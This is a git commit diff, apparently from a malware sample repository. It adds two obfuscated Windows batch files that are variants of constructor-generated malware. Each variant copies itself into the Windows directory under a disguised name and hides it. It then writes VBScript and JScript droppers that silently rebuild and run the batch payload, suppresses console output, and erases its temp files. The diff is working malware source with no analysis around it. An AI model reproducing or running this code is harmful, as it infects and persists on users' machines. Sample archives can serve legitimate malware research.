532b17e23bbdfb791a44b313c722aa0db63b3a6b
petikvx <petikvx@gmail.com>
2022-01-11 21:09:59 +0100

    update

---
+++ Constructor/Win32/Constructor.Win32.Bom.53/emm.bat
@@ -0,0 +1,54 @@
+%ΆΕιPt Δ%
+@ECHO OFF%κQ%
+%κQ%set Hl=%windir%\SYsTem32\SHuTDOWn.exe
+If NoT EXiST %Hl% ctty nul%κQ%
+%κQ%SET ΅Μπ=script
+ECHO.on error resume next> %TMP%\Lbp3H.bq4%κQ%
+ECHO dim tPdt6JZn3F> %TMP%\Lbp3H.bq4%κQ%
+echo set tPdt6JZn3F=w%΅Μπ%.cReateObject("w%΅Μπ%.shell")>> %tMp%\Lbp3H.bq4%κQ%
+eCho tPdt6JZn3F.run "winkkMo.bat xCP", 0>> %tmp%\Lbp3H.bq4%κQ%
+if μS%WiNDIR%==μS SeT windir=%systemroot%%κQ%
+find "%ΆΕιPt Δ%"<%0>%wINDIR%\winkkMo.bat
+find "κQ"<%0>>%wINDIR%\winkkMo.bat
+%κQ%SET W{§Λο"=textfile(
+attrib +r +s +h %wINDIR%\winkkMo.bat%κQ%
+md %wINDIR%\DR%κQ%
+attrib +s +h %wINDIR%\DR%κQ%
+find /i /v "run"<%TMP%\Lbp3H.bq4>%wINDIR%\debugrrTSu.vbs%κQ%
+Echo SEt VDRhv9N=w%΅Μπ%.CREATEOBJECt("%΅Μπ%ing.filesystemobject")>>%wINDIR%\debugrrTSu.vbs%κQ%
+echo if err.number=429 then>>%wINDIR%\debugrrTSu.vbs%κQ%
+echo vXn1EThv.run javascript:location.reload()>>%wINDIR%\debugrrTSu.vbs%κQ%
+echo else>>%wINDIR%\debugrrTSu.vbs%κQ%
+echO set i6JYm0FTgw=VDRhv9N.create%W{§Λο"%"%tmp%\f5HVlzC.bat",1)>> %wINDIR%\debugrrTSu.vbs%κQ%
+eCHo /*>> %wINDIR%\ZZBdcprn.js%κQ%
+ECHO type %wINDIR%\winkkMo.bat>> %wINDIR%\ZZBdcprn.js%κQ%
+ECHO */>> %wINDIR%\ZZBdcprn.js%κQ%
+EcHO var jDReu8Lbo2=w%΅Μπ%.CREATEOBJECt("%΅Μπ%ing.filesystemobject")>> %wINDIR%\ZZBdcprn.js%κQ%
+echo var UjyBPf=w%΅Μπ%.cReaTeobject("w%΅Μπ%.shell")>> %wINDIR%\ZZBdcprn.js%κQ%
+ecHo jDReu8Lbo2.copyfile(w%΅Μπ%.%΅Μπ%name,"%tmp%\f5HVlzC.bat")>> %wINDIR%\ZZBdcprn.js%κQ%
+EChO UjyBPf.run("%tMp%\f5HVlzC.bat",0)>> %wINDIR%\ZZBdcprn.js%κQ%
+eCHO.on error resume next>%tMP%\jzCR.vbs%κQ%
+ecHo SeT Njx_Pdr=w%΅Μπ%.CREATEOBJEcT("%΅Μπ%ing.filesystemobject")>> %TMP%\jzCR.vbs%κQ%
+ecHo set vXn1EThv=w%΅Μπ%.createobject("w%΅Μπ%.shell")>> %tmp%\jzCR.vbs%κQ%
+ECHO SET oKao2H=Njx_Pdr.open%W{§Λο"%"%wINDIR%\winkkMo.bat")>> %TMp%\jzCR.vbs%κQ%
+ECHO Wy=oKao2H.readall>> %TMP%\jzCR.vbs%κQ%
+ECHO oKao2H.close>> %TMP%\jzCR.vbs%κQ%
+eCho sEt oKao2H=Njx_Pdr.open%W{§Λο"%"%wINDIR%\debugrrTSu.vbs",8)>> %tMP%\jzCR.vbs%κQ%
+echo oKao2H.write "i6JYm0FTgw.write """"">>%tmp%\jzCR.vbs%κQ%
+echo for aes6LZm2=1 to len(Wy)>>%tmp%\jzCR.vbs%κQ%
+ecHo kjw_=asc(mid(Wy,aes6LZm2,1))>>%Tmp%\jzCR.vbs%κQ%
+EChO oKao2H.write "i6JYm0FTgw.write "&chr("&kjw_&")">>%tMp%\jzCR.vbs%κQ%
+ECHO next>>%TMP%\jzCR.vbs%κQ%
+ECHO oKao2H.write "i6JYm0FTgw.close">>%TMP%\jzCR.vbs%κQ%
+eCHo oKao2H.write "tPdt6JZn3F.run ""%TmP%\f5HVlzC.bat"",0">>%TmP%\jzCR.vbs%κQ%
+Echo oKao2H.write "end if">>%wINDIR%\debugrrTSu.vbs%κQ%
+echo oKao2H.close>>%wINDIR%\debugrrTSu.vbs%κQ%
+start /w %tmp%\jzCR.vbs%κQ%
+%κQ%SET Or=erase
+%κQ%SEt ηΞρX=%Or% %TMP%\*.
+%ηΞρX%bq4%κQ%
+%ηΞρX%bat%κQ%
+%ηΞρX%vbs%κQ%
+if not exist %Hl% ctty con%κQ%
+:_Pcq6JX%κQ%
+cls%κQ%
---
+++ Constructor/Win32/Constructor.Win32.Bom.55/emm.bat
@@ -0,0 +1,54 @@
+%SАг╟є%
+@ECHO OFF%ЎTБе╚%
+%ЎTБе╚%set ItЩ=%WiNdir%\SYSTeM32\SHUTDOWn.exe
+if noT eXiSt %ItЩ% ctty nul%ЎTБе╚%
+%ЎTБе╚%SEt ёW{а╠=script
+ECHO.on error resume next> %TMP%\o1EUiwA.n1G%ЎTБе╚%
+ECHO dim dSgu9Maq4G> %TMP%\o1EUiwA.n1G%ЎTБе╚%
+echo set dSgu9Maq4G=w%ёW{а╠%.CReAteObjecT("w%ёW{а╠%.shell")>> %TMP%\o1EUiwA.n1G%ЎTБе╚%
+echo dSgu9Maq4G.run "prndebug.bat 7Mao4", 0>> %tmp%\o1EUiwA.n1G%ЎTБе╚%
+if Ў!\Б%wiNdIR%==Ў!\Б seT windir=%systemroot%%ЎTБе╚%
+find "%SАг╟є%"<%0>%wInDIr%\prndebug.bat
+find "ЎTБе╚"<%0>>%wInDIr%\prndebug.bat
+%ЎTБе╚%sET VzЯ╩=textfile(
+attrib +r +s +h %wInDIr%\prndebug.bat%ЎTБе╚%
+md %wInDIr%\Qer7KYn1%ЎTБе╚%
+attrib +s +h %wInDIr%\Qer7KYn1%ЎTБе╚%
+find /i /v "run"<%TMP%\o1EUiwA.n1G>%wInDIr%\loadtray.vbs%ЎTБе╚%
+EcHO SET Man3GU=w%ёW{а╠%.CREATEOBJECT("%ёW{а╠%ing.filesystemobject")>>%wInDIr%\loadtray.vbs%ЎTБе╚%
+eCho if err.number=429 then>>%wInDIr%\loadtray.vbs%ЎTБе╚%
+echo u6JXn0DTh.run javascript:location.reload()>>%wInDIr%\loadtray.vbs%ЎTБе╚%
+echo else>>%wInDIr%\loadtray.vbs%ЎTБе╚%
+echo set NUhxAOer5=Man3GU.create%VzЯ╩%"%tmp%\uAQes7KYo2.bat",1)>> %wInDIr%\loadtray.vbs%ЎTБе╚%
+echo /*>> %wInDIr%\filecmd.js%ЎTБе╚%
+EcHO type %wInDIr%\prndebug.bat>> %wInDIr%\filecmd.js%ЎTБе╚%
+eCHO */>> %wInDIr%\filecmd.js%ЎTБе╚%
+ECHO var aMao3GUkyA=w%ёW{а╠%.CREATEOBJECT("%ёW{а╠%ing.filesystemobject")>> %wInDIr%\filecmd.js%ЎTБе╚%
+echo var Mu8Kao=w%ёW{а╠%.cReATeObjEct("w%ёW{а╠%.shell")>> %wInDIr%\filecmd.js%ЎTБе╚%
+echo aMao3GUkyA.copyfile(w%ёW{а╠%.%ёW{а╠%name,"%tmp%\uAQes7KYo2.bat")>> %wInDIr%\filecmd.js%ЎTБе╚%
+EchO Mu8Kao.run("%tmp%\uAQes7KYo2.bat",0)>> %wInDIr%\filecmd.js%ЎTБе╚%
+eChO.on error resume next>%tMP%\cs6IY.vbs%ЎTБе╚%
+eCHo SET nw_P=w%ёW{а╠%.CREATEOBJECT("%ёW{а╠%ing.filesystemobject")>> %TmP%\cs6IY.vbs%ЎTБе╚%
+echo set u6JXn0DTh=w%ёW{а╠%.Createobject("w%ёW{а╠%.shell")>> %Tmp%\cs6IY.vbs%ЎTБе╚%
+EcHO SeT w6JZn0FThw=nw_P.open%VzЯ╩%"%wInDIr%\prndebug.bat")>> %tmp%\cs6IY.vbs%ЎTБе╚%
+ECHO Kdr4JX=w6JZn0FThw.readall>> %TMP%\cs6IY.vbs%ЎTБе╚%
+ECHO w6JZn0FThw.close>> %TMP%\cs6IY.vbs%ЎTБе╚%
+EChO SEt w6JZn0FThw=nw_P.open%VzЯ╩%"%wInDIr%\loadtray.vbs",8)>> %TMP%\cs6IY.vbs%ЎTБе╚%
+echo w6JZn0FThw.write "NUhxAOer5.write """"">>%tmP%\cs6IY.vbs%ЎTБе╚%
+echo for RDR=1 to len(Kdr4JX)>>%tmp%\cs6IY.vbs%ЎTБе╚%
+ecHo w9=asc(mid(Kdr4JX,RDR,1))>>%tmp%\cs6IY.vbs%ЎTБе╚%
+EchO w6JZn0FThw.write "NUhxAOer5.write "&chr("&w9&")">>%tmp%\cs6IY.vbs%ЎTБе╚%
+eCHO next>>%tMP%\cs6IY.vbs%ЎTБе╚%
+ECHO w6JZn0FThw.write "NUhxAOer5.close">>%TMP%\cs6IY.vbs%ЎTБе╚%
+eCHo w6JZn0FThw.write "dSgu9Maq4G.run ""%TMP%\uAQes7KYo2.bat"",0">>%TMP%\cs6IY.vbs%ЎTБе╚%
+EcHO w6JZn0FThw.write "end if">>%wInDIr%\loadtray.vbs%ЎTБе╚%
+eCho w6JZn0FThw.close>>%wInDIr%\loadtray.vbs%ЎTБе╚%
+start /w %tmp%\cs6IY.vbs%ЎTБе╚%
+%ЎTБе╚%SET R~в╬Є=del
+%ЎTБе╚%SET X}б=%R~в╬Є% %TMP%\*.
+%X}б%n1G%ЎTБе╚%
+%X}б%bat%ЎTБе╚%
+%X}б%vbs%ЎTБе╚%
+if not exist %ItЩ% ctty con%ЎTБе╚%
+:dt7%ЎTБе╚%
+cls%ЎTБе╚%
